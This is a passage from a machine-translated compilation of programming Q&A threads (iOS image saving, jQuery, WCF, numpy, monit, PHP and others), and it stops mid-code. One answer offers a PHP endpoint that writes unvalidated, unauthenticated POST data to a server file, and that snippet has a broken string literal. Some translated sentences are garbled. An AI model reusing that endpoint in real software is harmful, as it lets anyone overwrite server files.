- (void)imagePickerController:(UIImagePickerController*)picker didFinishPickingMediaWithInfo:(NSDictionary*)info
{
    NSLog(@"TEST imagePickerController");
    NSDate* dateFunctionStart = [NSDate date];

    NSLog(@"respond...");
    if ([picker respondsToSelector:@selector(presentingViewController)]) {
        [[picker presentingViewController] dismissModalViewControllerAnimated:YES];
    } else {
        [[picker parentViewController] dismissModalViewControllerAnimated:YES];
    }
    NSLog(@"done");

    // get the image
    NSLog(@"get the image...");
    UIImage* image = [info objectForKey:UIImagePickerControllerOriginalImage];
    NSLog(@"done");
    NSLog(@"correct image for orientation...");
    image = [self imageCorrectedForCaptureOrientation:image]; // 3 sec
    //image = [image rotate:[image imageOrientation]]; // 1 - 6 sec
    NSLog(@"done");

    NSLog(@"make thumbnail...");
    CGSize thumbnailSize = CGSizeMake(200, 200);
    UIImage *thumbnailImage = [self imageByScalingNotCroppingForSize:image toSize:thumbnailSize];
    NSLog(@"done");

    NSLog(@"jpeg representation 1...");
    NSData* imageData = UIImageJPEGRepresentation(image, 1.0); // 4 sec
    NSLog(@"done");
    NSLog(@"jpeg representation 2...");
    NSData* thumbnailData = UIImageJPEGRepresentation(thumbnailImage, 1.0);
    NSLog(@"done");

    NSLog(@"save image and thumbnail...");
    NSString* imageRet = [self saveData:imageData toFile:self.imageName];   
    NSString* thumbRet = [self saveData:thumbnailData toFile:self.thumbnailName];
    NSLog(@"done");

    NSLog(@"array two images...");
    //NSString *jsResult = [NSString stringWithFormat:@"{%@, %@}", imageRet, thumbRet];
    NSArray *jsResultA = [NSArray arrayWithObjects:imageRet, thumbRet, nil];
    NSLog(@"done");

    NSLog(@"plugin stuff...");
    CDVPluginResult* result = [CDVPluginResult resultWithStatus: CDVCommandStatus_OK messageAsArray:jsResultA];
    NSString* jsString = [result toSuccessCallbackString:self.callBackID];
    [self.webView stringByEvaluatingJavaScriptFromString:jsString];
    NSLog(@"done");

    timeFunc(dateFunctionStart, @"total time");
    NSLog(@"TEST END imagePickerController");

} 
```

这是`imageCorrectedForCaptureOrientation`方法：

```
- (UIImage*) imageCorrectedForCaptureOrientation:(UIImage*)anImage
{
    NSLog(@"IMAGE CORRECTION IN");
    NSDate* start = nil;

    float rotation_radians = 0;
    bool perpendicular = false;

    switch ([anImage imageOrientation]) {
        case UIImageOrientationUp:
            rotation_radians = 0.0;
            break;
        case UIImageOrientationDown:
            rotation_radians = M_PI; 
            break;
        case UIImageOrientationRight:
            rotation_radians = M_PI_2;
            perpendicular = true;
            break;
        case UIImageOrientationLeft:
            rotation_radians = -M_PI_2;
            perpendicular = true;
            break;
        default:
            break;
    }

    UIGraphicsBeginImageContext(CGSizeMake(anImage.size.width, anImage.size.height));
    CGContextRef context = UIGraphicsGetCurrentContext();

    // Rotate around the center point
    CGContextTranslateCTM(context, anImage.size.width/2, anImage.size.height/2);
    CGContextRotateCTM(context, rotation_radians);

    CGContextScaleCTM(context, 1.0, -1.0);
    float width = perpendicular ? anImage.size.height : anImage.size.width;
    float height = perpendicular ? anImage.size.width : anImage.size.height;
    CGContextDrawImage(context, CGRectMake(-width / 2, -height / 2, width, height), [anImage CGImage]);

    // Move the origin back since the rotation might've change it (if its 90 degrees)
    if (perpendicular) {
        CGContextTranslateCTM(context, -anImage.size.height/2, -anImage.size.width/2);
    }

    UIImage *newImage = UIGraphicsGetImageFromCurrentImageContext();

    UIGraphicsEndImageContext();

    NSLog(@"IMAGE CORRECTION OUT");

    return newImage;
} 
```

我没有找到其他更好的方法来保存图像 `NSData* imageData = UIImageJPEGRepresentation(image, 1.0); // 4 sec`

普通相机应用程序如何工作得如此之快？它会在一秒钟内拍摄图像、旋转图像并将图像保存到闪存中。如何产生这种效果？

任何帮助表示赞赏。

编辑：没有解决方案。我会放一些自定义 UIView 来播放一些动画来通知用户正在发生的事情。由于图像很大，为 1.5 MB，因此这些操作必须持续一段时间。也许有解决方案可以加快拍摄图像、处理图像然后保存到磁盘的整个过程，但我不知道。

我决定使用[https://github.com/matej/MBProgressHUD](https://github.com/matej/MBProgressHUD)，因为它似乎是完整的解决方案。如果事实证明它很复杂，因为我是 Objective-c 菜鸟，我会放 UIProgressView 之类的。

无论如何，感谢所有人的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-18T09:10:32.870

我建议你使用 GCD 并在另一个线程中处理图像......每次调用 UIImageJpegRepresentation 确实会花费很多，因为它确实会将图像解码到设备的内存中......

```
- (void)imagePickerController:(UIImagePickerController*)picker didFinishPickingMediaWithInfo:(NSDictionary*)info
{

NSLog(@"TEST imagePickerController");
NSDate* dateFunctionStart = [NSDate date];

NSLog(@"respond...");
if ([picker respondsToSelector:@selector(presentingViewController)]) {
    [[picker presentingViewController] dismissModalViewControllerAnimated:YES];
} else {
    [[picker parentViewController] dismissModalViewControllerAnimated:YES];
}
NSLog(@"done");

// get the image
NSLog(@"get the image...");
UIImage* image = [info objectForKey:UIImagePickerControllerOriginalImage];
NSLog(@"done");
NSLog(@"correct image for orientation...");

dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT,0), ^(void) {
    image = [self imageCorrectedForCaptureOrientation:image]; // 3 sec
    //image = [image rotate:[image imageOrientation]]; // 1 - 6 sec
    NSLog(@"done");

    NSLog(@"make thumbnail...");
    CGSize thumbnailSize = CGSizeMake(200, 200);
    UIImage *thumbnailImage = [self imageByScalingNotCroppingForSize:image toSize:thumbnailSize];
    NSLog(@"done");

    NSLog(@"jpeg representation 1...");
    NSData* imageData = UIImageJPEGRepresentation(image, 1.0); // 4 sec
    NSLog(@"done");
    NSLog(@"jpeg representation 2...");
    NSData* thumbnailData = UIImageJPEGRepresentation(thumbnailImage, 1.0);
    NSLog(@"done");

    NSLog(@"save image and thumbnail...");
    NSString* imageRet = [self saveData:imageData toFile:self.imageName];
    NSString* thumbRet = [self saveData:thumbnailData toFile:self.thumbnailName];
    NSLog(@"done");

    NSLog(@"array two images...");
    //NSString *jsResult = [NSString stringWithFormat:@"{%@, %@}", imageRet, thumbRet];
    NSArray *jsResultA = [NSArray arrayWithObjects:imageRet, thumbRet, nil];
    NSLog(@"done");

    dispatch_async(dispatch_get_main_queue(),^ {
        NSLog(@"plugin stuff...");
        CDVPluginResult* result = [CDVPluginResult resultWithStatus: CDVCommandStatus_OK messageAsArray:jsResultA];
        NSString* jsString = [result toSuccessCallbackString:self.callBackID];
        [self.webView stringByEvaluatingJavaScriptFromString:jsString];
        NSLog(@"done");

        timeFunc(dateFunctionStart, @"total time");
        NSLog(@"TEST END imagePickerController");

    });

}); 
```

}

另一个想法是查看 Brad Larson 的 GPUImage 并使用它，但是请记住，无论在哪里、如何以及以何种方式，全图像大小的操作都是昂贵的。

最好的办法是只尽快准备您将在您的应用程序中立即使用的内容，并在后台队列中运行其他任务并在那里完成它们......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T16:17:25.537

我没有过多地使用 CoreGraphics 来了解如何使其更高效，但可以肯定的是，iPhone 3G 并不是一个很好的性能基准模型。此外，图像的大小极大地影响了处理时间。

最后一件事，如果您愿意，您可以使用自定义 UIView 子类进行绘图。采用这种方法，可以将子类的 CALayer 改为 CATiledLayer，有效地在后台绘制。

# jquery - fancybox 通过外部链接打开一组分组图像

> ID：12461396
> 
> 赞同：0
> 
> 时间：2012-09-17T14:25:02.673
> 
> 标签：jquery, fancybox

我有一个包含多个图像的产品列表，每个产品都有自己的`rel="group123"`，以便将它们分组。

我的问题是如何从产品名称链接到该组？

[例子](http://www.equi-trek.com/uk/pre-owned)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:31:01.730

只需添加`rel="group123"`到您的产品名称链接即可。

# javascript - 向 jQuery 的 .first() 方法添加谓词

> ID：12461398
> 
> 赞同：2
> 
> 时间：2012-09-17T14:25:08.380
> 
> 标签：javascript, jquery

是否有可能在不对原始源代码产生很大影响的情况下扩展 jQuery`.first()`方法以便它可以接受谓词参数？从根本上说，我想要它做的是类似于 LINQ 的[`.First()`](http://msdn.microsoft.com/en-us/library/bb535050.aspx)C# 方法。在 JavaScript 中，它看起来像这样：

```
function first(arr, predicate) {
    for (var i = 0; i < arr.length; i++) {
        // return the first item fulfilling the predicate
        if (predicate.call(arr[i])) {
            return arr[i];
        }
    }
}

var myArray = [1, 3, 5],
    myPredicate = function() {
        return this >= 2;
    };

var result = first(myArray, myPredicate); // should give '3' 
```

我知道它可以很容易地用 JavaScript 实现；我只是好奇是否可以在 jQuery 中轻松扩展现有方法。

## 使用的解决方案：

```
$.fn.firstOne = function(predicate) {
    // validate the predicate is a function
    if ($.isFunction(predicate)) {
        // iterate through each item, finding the first match
        for (var i = 0; i < this.length; i++) {
            if (predicate.call(this.eq(i), i)) {
                return this.eq(i);
            }
        }
    }

    // maintain chainability
    return $();
}; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T14:32:18.287

您可以根据需要轻松（安全地）创建自己的方法，

```
$.fn.firstfn = function(fn) {
    return this.filter(fn).first()
}

$("#nav > li").firstfn(function() {
    return $(this).text() === "John Smith";
}); 
```

但是，我不建议您覆盖现有方法。只需添加您自己的方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:26:44.217

您可以使用自己的函数轻松扩展 jQuery，[请参阅此问题了解如何执行此操作](https://stackoverflow.com/questions/5007279/extending-an-existing-jquery-function)

但它已经内置了`first()`与谓词/选择器有关的选择器。这里有些例子

```
$("#mycontainer li.classYouWant").first();
$("#mycontainer").find("another selector").first();
$("#mycontainer li a:first"); 
```

# coding-style - 硬引号与软引号。使用哪个以及何时使用？

> ID：12461403
> 
> 赞同：1
> 
> 时间：2012-09-17T14:25:24.830
> 
> 标签：coding-style, quotes

这个问题困扰了我一段时间。我看到很多人在他们的代码中使用软引号。然而，我几乎在任何地方都使用硬引号。我认为在某些情况下，硬引号可能会更好（例如在 PHP 中将变量放在带有荣誉的字符串中）。但是现在硬引号和软引号之间有什么区别？在什么情况下哪个更好？不同语言的引号有什么区别吗？会影响速度吗？如果可能的话，请提供完整而详细的答案，因为这可能对初学者也有很好的帮助。谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T15:41:24.577

这个话题不能以与语言无关的方式来讨论，因为许多语言为这两种引用分配了不同的语义。

在某些语言中，这两种引用风格的含义完全不同：在 C 语言家族中，字符串用双引号括起来，而字符用单引号括起来；在 Postgres 中，字符串用单引号括起来，而双引号转义*标识符*。在这些语言中，您别无选择，必须使用正确的引号。

在其他语言中，两者之间*没有*语义差异：Python 不区分这两种风格。在这种情况下，选择一种风格而不是另一种风格并坚持下去可能是值得的，但你喜欢哪一种并不重要；选择一个约定而不是随机使用这两种样式的原因是，它将使您免于将来出现不匹配的引号。选择避免反斜杠的引用样式也可能有（非常轻微的）性能优势，因为它们的处理将（非常轻微地）比字符串中的非特殊字符更昂贵。

在另一个语言家族中，单引号中的字符串*不*被解析为变量插值，而变量引用被替换为双引号字符串。即使在这些语言中，还有*更多*不同的风格：例如，`bash`不对单引号字符串执行*任何*解析，这意味着您甚至不能在此处用反斜杠引用文字单引号 (`'foo\'bar'`是一个错误；您需要`'foo'\''bar'`包含字面单引号）。

在对单引号字符串不执行任何类型转义的语言中，这些将是性能最佳的字符串文字类型。在开始引号之后，解析器只寻找*结束*引号（可以很好地优化），而不关心字符串的实际内容。

在检查字符串内容的语言中*，*性能将与语法复杂度成正比。*至少*必须扫描字符串是否出现任何特殊字符，如果有，则需要对其进行处理（例如，反斜杠可能只跳过下一个字符，但解析器可能还需要检查它之后的几个字符, 如果语法允许像`\0x##`) 这样的序列。

如果语言允许在字符串中进行变量插值，其性能取决于具体的实现。解析字符串中的变量引用`"foo $var bar"`可能是一个复杂的过程，但另一方面`'foo '.$var.' bar'`涉及到两个字符串连接，连接也是一个昂贵的过程——每个连接都需要分配一个新的字符串并将两个操作数复制到其中；对于长字符串，这可能会变得*非常昂贵。*特定语言的实现可能会更好地优化以解析和替换插值字符串中的变量，而另一种实现可能更好地优化多个字符串的串联（例如，通过使用像[绳索这样的结构](http://en.wikipedia.org/wiki/Rope_%28computer_science%29)内部）。尽管如此，这两种作曲风格的表现不太可能有很大不同。

# java - 更改 Tomcat 日志文件路径

> ID：12461405
> 
> 赞同：0
> 
> 时间：2012-09-17T14:25:31.900
> 
> 标签：java, tomcat, logging, path

我正在尝试将 Tomcat 日志文件重定向到应用程序的文件夹中。

我知道我可以更改 conf/logging.properties 中日志文件的路径，但我想从应用程序中找到一种方法，以便能够根据正在部署的应用程序更改路径。

有没有办法做到这一点？

谢谢你的时间，

# exchange-server - EWS CreateItem 将所有消息创建为草稿

> ID：12461407
> 
> 赞同：3
> 
> 时间：2012-09-17T14:25:36.240
> 
> 标签：exchange-server, exchangewebservices

我正在尝试按照[http://msdn.microsoft.com/en-us/library/exchange/aa566468%28v=exchg.140%29.aspx](http://msdn.microsoft.com/en-us/library/exchange/aa566468%28v=exchg.140%29.aspx)使用 Exchange Web Services for Exchange 2010 的 CreateItem 函数来创建一个信息。无论我做什么，邮件总是以草稿的形式出现在 Outlook 中。这是我发送的 XML：

```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2010_SP1"/>
  </soap:Header>
  <soap:Body>
    <CreateItem MessageDisposition="SaveOnly" xmlns="http://schemas.microsoft.com/exchange/services/2006/messages">
      <SavedItemFolderId>
        <t:FolderId ChangeKey="..." Id="..."/>
      </SavedItemFolderId>
      <Items>
        <t:Message>
          <t:MimeContent CharacterSet="UTF-8">BASE64 ENCODED MESSAGE</t:MimeContent>
          <t:ItemClass>IPM.Note</t:ItemClass>
          <t:Subject>THE SUBJECT LINE</t:Subject>
          <t:Sensitivity>Normal</t:Sensitivity>
          <t:Importance>Normal</t:Importance>
          <t:Culture>en-US</t:Culture>
          <t:IsRead>true</t:IsRead>
        </t:Message>
      </Items>
    </CreateItem>
  </soap:Body>
</soap:Envelope> 
```

我尝试将 <t:IsDraft>false</t:IsDraft> 添加到 <t:Message/> 但似乎不允许这样做。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-09-18T14:45:47.433

游戏迟到了，但我们有这个，这是由于 Exchange 机器上的存储空间不足。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-11-18T08:44:35.113

如果您未在请求中指定`PR_MESSAGE_FLAGS`扩展属性，[则默认为](https://msdn.microsoft.com/en-us/library/cc839733(v=office.12).aspx)(decimal )。换句话说，一个未读、未修改的草稿。`CreateItem`[`MSGFLAG_UNSENT | MSGFLAG_UNMODIFIED`](https://msdn.microsoft.com/en-us/library/cc839733(v=office.12).aspx)`10`

```
The initial values for this property are typically MSGFLAG_UNSENT
and MSGFLAG_UNMODIFIED to indicate a message that has not yet been
sent or changed. When a message is saved for the second time, the
message store provider clears the MSGFLAG_UNMODIFIED flag. 
```

如果您将以下内容添加到您的请求中`<Message>`，您将创建一个已读非草稿：

```
 <t:ExtendedProperty> 
    <t:ExtendedFieldURI PropertyTag="3591" PropertyType="Integer" /> 
    <t:Value>1</t:Value> 
  </t:ExtendedProperty> 
```

（扩展属性的`Value`手段`1`。`MSGFLAG_READ`）

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2014-10-24T20:06:48.757

很晚了，但是今天在寻找我时出现了。

MessageDisposition 控制它是否是草稿。你有`<CreateItem MessageDisposition="SaveOnly"`，需要`<CreateItem MessageDisposition="SendAndSaveCopy"`

# wcf - WCF“对象图中可以序列化或反序列化的最大项目数是'65536'”

> ID：12461411
> 
> 赞同：3
> 
> 时间：2012-09-17T14:25:58.113
> 
> 标签：wcf, datacontractserializer

我知道这已经被问过几次了，但是我尝试了 stackoverfolow 上的所有解决方案，但它们似乎都不起作用，所以就这样了：

我有一个服务（在 NetTCP 绑定上运行），它只是等待连接并在调用时将工作分配给另一个服务，它传递的数据很大，因此我收到此错误：

对象图中可以序列化或反序列化的最大项目数为 '65536'”</p>

下面是我的配置：

```
<services>
    <service behaviorConfiguration="CoreBehavior" name="PrepService">
        <endpoint address="net.tcp://localhost/Preparation" 
                  binding="netTcpBinding" 
                  contract="IWorkManagerService"
                  bindingConfiguration="CoreTcpBinding"/>            
    </service>
</services>
<bindings>
    <netTcpBinding>
        <binding name="CoreTcpBinding" closeTimeout="00:10:00" openTimeout="00:10:00"
                 sendTimeout="00:10:00" maxBufferSize="2147483647"
                 maxBufferPoolSize="2147483647" maxReceivedMessageSize="2147483647">
          <readerQuotas maxDepth="64" maxStringContentLength="2147483647"
                 maxArrayLength="2147483647" maxBytesPerRead="2147483647" maxNameTableCharCount="2147483647" />
            <security mode="None"/>
        </binding>          
    </netTcpBinding>
</bindings>    
<behaviors>
    <serviceBehaviors>
        <behavior name="CoreBehavior">
            <serviceMetadata httpGetEnabled="false"  />
            <dataContractSerializer maxItemsInObjectGraph="2147483647"/>
            <serviceDebug includeExceptionDetailInFaults="true"/>
        </behavior>
    </serviceBehaviors>
</behaviors> 
```

正如您在我的 CoreTcpBinding 中看到的那样，我几乎已经用尽了所有配置值，但我仍然不断收到相同的错误，我只是对为什么它默认为 "65536" 感到困惑？

调用上面定义的服务的服务（客户端）有如下配置：

```
<services>
        <service behaviorConfiguration="CoreBehavior" name="AssignmentService">
         <endpoint address="net.tcp://localhost:8001/Assignment"
                          binding="netTcpBinding"
                          contract="IWorkerService" 
                          bindingConfiguration="CoreTcpBinding"/>
          </service>
 </services> 

            <bindings>
                <netTcpBinding>
                    <binding name="CoreTcpBinding" 
                             maxBufferPoolSize="2147483647"
                             maxReceivedMessageSize="2147483647">                  
                        <security mode="None"/>                 
                    </binding>
                </netTcpBinding>
            </bindings>
            <behaviors>        
                <serviceBehaviors>
                    <behavior name="CoreBehavior">
                        <dataContractSerializer maxItemsInObjectGraph="2147483647" />
                        <serviceDebug includeExceptionDetailInFaults="true"/>
                    </behavior>
                </serviceBehaviors>
            </behaviors> 
```

客户端像往常一样通过代理与服务器对话：

```
var proxy = new PrepServiceProxy(new NetTcpBinding(), new EndpointAddress(ServiceAddress));

Proxy Code : 
 public PrepServiceProxy(Binding binding, EndpointAddress remoteAddress) : base(binding, remoteAddress)
        {            
            var netTcpBinding = binding as NetTcpBinding;

            if (netTcpBinding != null)
                (netTcpBinding).Security.Mode = SecurityMode.None;           

        } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T14:28:43.733

您必须在客户端和服务器端进行配置。确保两边都有 dataContractSerializer maxItemsInObjectGraph="2147483647"。

# python - 为什么将 numpy 数组与列表进行比较会消耗这么多内存？

> ID：12461413
> 
> 赞同：7
> 
> 时间：2012-09-17T14:26:06.870
> 
> 标签：python, arrays, list, memory-management, numpy

这一点最近刺痛了我。我通过从代码中删除所有 numpy 数组与列表的比较来解决它。但是为什么垃圾收集器会错过收集它呢？

运行它，看着它吃掉你的记忆：

```
import numpy as np
r = np.random.rand(2)   
l = []
while True:
    r == l 
```

在 64 位 Ubuntu 10.04、virtualenv 1.7.2、Python 2.7.3、Numpy 1.6.2 上运行

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-19T14:10:25.267

以防万一有人偶然发现这个并想知道...

@Dugal 是的，我相信这是当前 numpy 版本（2012 年 9 月）中的内存泄漏，发生在引发一些异常时（参见[this](http://projects.scipy.org/numpy/ticket/2216)和[this](https://github.com/numpy/numpy/pull/449)）。为什么添加`gc`@BiRico 确实“修复”的调用对我来说似乎很奇怪，尽管它必须在看起来之后立即完成？如果有人知道异常处理和垃圾收集 CPython 内部，我会感兴趣，这可能与 python 垃圾收集回溯的方式很奇怪。

**解决方法**：这与列表没有直接关系，但例如大多数广播异常（空列表不适合数组大小，空数组会导致相同的泄漏。请注意，内部准备了一个永远不会出现的异常）。因此，作为一种解决方法，您可能应该首先检查形状是否正确（如果您经常这样做，否则我不会担心，如果我做对了，这只会泄漏一个小字符串）。

**已修复：**此问题将在 numpy 1.7 中修复。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-19T02:25:19.727

抱歉，我无法给出更完整的答案，但这似乎与垃圾收集有关。我能够在 Redhat 5.8 上使用 python 2.7.2、numpy 1.6.1 重新创建这个问题。但是，当我尝试以下操作时，内存使用恢复正常。

```
import gc
import numpy as np
r = np.random.rand(2)   
l = []
while True:
    r == l
    gc.collect() 
```

# javascript - 编写文件并使用 Javascript 将其发送回

> ID：12461419
> 
> 赞同：0
> 
> 时间：2012-09-17T14:26:25.957
> 
> 标签：javascript, xml

这就是我需要的：

我需要使用标准代码从服务器获取 XML 文件：

```
if(window.XMLHttpRequest)
    xmlhttp = new XMLHttpRequest();
else
    xmlhttp = new ActiveXObject("Microsoft.XMLHTTP"); // For IE6

xmlhttp.open("GET", xml_file, false);
xmlhttp.send();
xmldoc = xmlhttp.responseXML; 
```

在此之后，我需要对收到的 XML 信息进行一些更改并将其保存到服务器。这可能吗？我可以编辑文件客户端并将其发送到服务器以替换旧文件吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:34:14.717

好吧，你可以，但你需要一个服务器端脚本来接受文件（作为字符串）并保存它。

您将需要一个 url 来接受文件的内容并将其写入服务器：

//site.com/writeXML.php

该文件将接受文件的内容（例如 file_contents 参数） 现在您必须将内容发送到文件

```
//Do something with xmlDoc

if(window.XMLHttpRequest)
  xmlhttp = new XMLHttpRequest();
else
  xmlhttp = new ActiveXObject("Microsoft.XMLHTTP"); // For IE6
  xmlhttp.open("POST", "http://site.com/writeXML.php", false);
  xmlhttp.send("file_contents="+xmlDoc); 
```

在服务器端，您需要接受数据并将其写入文件，如下所示：

```
 $contents=$_POST['file_contents'];
   $handle = fopen("/home/user/data/xmlFile.xml, "wb");
   fwrite($handle, $contents); 
```

# r - 线性模型残差的均值和中位数

> ID：12461429
> 
> 赞同：8
> 
> 时间：2012-09-17T14:22:28.843
> 
> 标签：r, mean

我刚开始学习 R，需要一些帮助来找到我的数据的残差平均值和中位数。我计算了 lm 并在总结中得到如下残差：

```
min       1Q        median  3Q      Max
-111.86   -34.90     -7.6   33.46   182.58 
```

**问题**：所以残差的中位数是-7.6，但这是我的平均值吗？ **或者是否有计算残差的平均值和中位数？** 我打算做 mean(resid(trees.lm) 还是应该输入 mean(trees.lm$resid)

请澄清一下，因为我的同学对同一数据集都有不同的反应。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-17T14:28:23.163

这里一个具体问题的答案是：

```
mean(resid(trees.lm)) 
```

您不应该像这样深入研究拟合的模型对象并去除任意组件。当你意识到你刚刚通过以下方式提取了工作残差时，在像 GLM 这样更复杂的东西上这样做会咬你的手：

```
glm.mod.obj$residuals 
```

这不太可能对您有用。

即使对于像对象这样的简单事物`lm()`，使用`resid()`或访问的内容`$residuals`也可能会有所不同，具体取决于模型的拟合方式（`na.action`例如，参数的设置是什么？）。

此外，线性模型假设残差是具有均值 0 和方差 $\hat{\sigma}^2}$ 的 iid 高斯（或正态）随机变量，因此均值应该非常接近 0（即非常、非常、非常接近 0 但不完全是因为这是一台计算机并且浮点运算正在发挥作用）。

# passenger - Monit 不会使用 kill 命令停止脚本

> ID：12461432
> 
> 赞同：3
> 
> 时间：2012-09-17T14:27:21.437
> 
> 标签：passenger, monit

我正在使用 monit 来监控几个进程。这些过程包括乘客实例和我编写的为乘客实例生成 pidfile 的守护程序。Monit 将启动这些过程没有问题。它不会阻止他们。以下是守护进程的 Monit 配置：

```
check process passenger_monitor with pidfile <%= passenger_monitor_pid %>
   group <%= application %>
   start program = "/bin/su - rails_apps -c 'source /home/rails_apps/.rvm/scripts/rvm; /home/rails_apps/passenger_monitor.rb'"
   stop program = "/bin/kill `/bin/cat <%= passenger_monitor_pid %>`" 
```

它是一个通过 capistrano 生成的 erb 模板。如果我通过具有最小环境的 root 身份通过终端运行停止命令，那么它可以工作，但是当我请求 Monit 停止进程时，我收到以下错误：

```
[ADT Sep 17 10:38:31] error    : 'passenger_monitor' failed to stop 
```

我已经尝试了我能想到的一切。我找不到或生成停止命令输出的任何日志。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-12-18T21:34:33.160

尝试使用停止服务时遇到同样的问题

```
stop program = "/bin/kill `/bin/cat /var/run/pusher.pid`" 
```

您可以打开`-Iv`标志以查看调试输出：

```
monit -Iv 
```

或者您可以在 monit 在后台运行时手动验证：

```
monit validate 
```

他们都显示

```
'api-pusher-service' stop: /bin/kill
kill: can't find process "`/bin/cat"
kill: can't find process "/var/run/pusher.pid`" 
```

这解决了我的问题

```
stop program = "/bin/bash -c '/bin/kill `/bin/cat /var/run/pusher.pid`'" 
```

# c++ - Windows 应用程序启动我控制台

> ID：12461435
> 
> 赞同：0
> 
> 时间：2012-09-17T14:27:29.520
> 
> 标签：c++, console, windows-applications

今天我编译了我的 c++ Windows 应用程序，它已经启动了控制台和应用程序，但控制台从未出现过。有人能告诉我如何删除控制台吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:31:30.007

如果您的链接器设置有 /SUBSYSTEM:CONSOLE，就会发生这种情况。将其更改为 /SUBSYSTEM:WINDOWS

[http://msdn.microsoft.com/en-us/library/fcc1zstk%28v=vs.100%29.aspx](http://msdn.microsoft.com/en-us/library/fcc1zstk%28v=vs.100%29.aspx)

或者打开可执行文件的属性页并将链接器/系统/子系统更新为 Windows。

编辑：既然您指定您没有使用 Visual Studio，我知道属性页将无济于事。我不确定 Dev C++ 是否正在使用 mingw，尽管即使它是我也忍不住要找到如何修复链接器设置，因为我也不使用 mingw。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T15:48:37.653

对于`mingw`编译器，您应该像这样传递`-subsystem windows`给链接器

```
g++ -Wl,-subsystem,windows <other linker options> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T15:19:25.290

我刚刚重新启动了 Dev C++ 并修复了一些错误，我从应用程序中删除了一些文件，我认为它们可能是问题，因为我有 2 个空的 .rc 文件。因此，如果有人遇到此问题，请尝试查看垃圾并重新启动应用程序

# python - 不赞成在 Python 中将类用作父类

> ID：12461436
> 
> 赞同：7
> 
> 时间：2012-09-17T14:27:30.993
> 
> 标签：python, inheritance, metaclass

我正在使用 Python 2.x 框架，该框架的最新版本已将一些广泛使用的基类从一个模块移到另一个`A`模块`B`（并且这些类已在此过程中重命名为更清晰的名称）。模块`A`为新的类名定义了一个向后兼容的标识符。

B.py：

```
class BaseClass(object):
    __metaclass__ = framework_meta # handles registration etc. 
```

一个.py：

```
import B
oldbase = B.BaseClass 
```

现在为了帮助人们迁移他们的代码，我希望能够在`DeprecationWarning`使用框架的代码定义一个派生自`A.oldbase`告诉程序员直接继承的类时发出（使用warnings.warn） `B.BaseClass`。

我希望这可以通过元类来实现。我试图声明一个从框架元类派生的新元类

```
class deprecated_base_class(framework_meta):
    def __new__(meta, name, bases, attrs):
        warning = '%(class)s is deprecated'
        for b in bases:
            warning =  getattr(b, '__deprecation_warning__', None) or warning
        warn(warning % {'class': name}, DeprecationWarning, stacklevel=2)
        return super(deprecated_base_class, meta).__new__(meta, name, bases, attrs) 
```

和...一起：

一个.py：

```
class oldbase(B.BaseClass):
    __metaclass__ = deprecated_base_class
    __deprecation_warning__ = 'class oldbase is deprecated. Use B.BaseClass instead' 
```

客户端代码.py

```
class FooBar(oldbase):
    pass 
```

我现在遇到的问题是，我得到`DeprecationWarning`了`oldbase`. 我怎样才能解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:35:44.313

如果不推荐使用任何基础，您希望显示警告：

```
class deprecated_base_class(framework_meta):
    def __new__(meta, name, bases, attrs):
        for b in bases:
            if isinstance(b, deprecated_base_class):
                warning = getattr(b, '__deprecation_warning__', '%(class)s is deprecated')
                warn(warning % {'class': b.__name__}, DeprecationWarning, stacklevel=2)
        return super(deprecated_base_class, meta).__new__(meta, name, bases, attrs) 
```

# php - 使用 Twitter API 发布 £ 符号（英镑）导致更新失败

> ID：12461437
> 
> 赞同：1
> 
> 时间：2012-09-17T14:27:34.057
> 
> 标签：php, twitter

我正在使用[Abraham 的 Twitter API](https://github.com/abraham/twitteroauth)发布到 Twitter（显然）。

`£`在我尝试在推文中使用 a 之前，一切都很好。

如果我使用`£`我得到错误`Could not authenticate with OAuth`。

如果我尝试使用`&pound;`，我真的会`&pound;`进入推文。

我试过使用`utf8_encode`并且`url_encode`我也刚刚在我的脚本中添加了一个标题

```
header('Content-Type: text/html; charset=utf-8'); 
```

但这也没有改变任何东西。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-19T17:01:46.917

我刚刚遇到了同样的问题，我在[这里](https://groups.google.com/forum/?fromgroups#!topic/twitter-development-talk/GXGM8Bo54aM)找到了解决方案。基本上我必须在包含井号的字符串上使用[utf8_encode()函数。](http://php.net/manual/en/function.utf8-encode.php)

# php - 两个数组的谷歌散点图

> ID：12461440
> 
> 赞同：0
> 
> 时间：2012-09-17T14:27:40.913
> 
> 标签：php, javascript, jquery, html, google-visualization

大家好，这里是我正在使用的 Google 分散图表代码：

```
require '/lib/GoogleChart.php';
require '/lib/markers/GoogleChartShapeMarker.php';
require '/lib/markers/GoogleChartTextMarker.php';

$Variance=array();
$Emp_RecFactor=array();
$Emp_Id=array();

//$Emp_FirstName=array();
$EquityGraph=new EquityGraph();
$EquityGraph->Graph();
$DrawGraph=$EquityGraph->DrawGraph;

foreach($DrawGraph as $key=>$value)
{
    $Variance[]=$value["Variance"];//for multiple values ,array
    $Emp_RecFactor[]=$value["Emp_RecFactor"];//single value
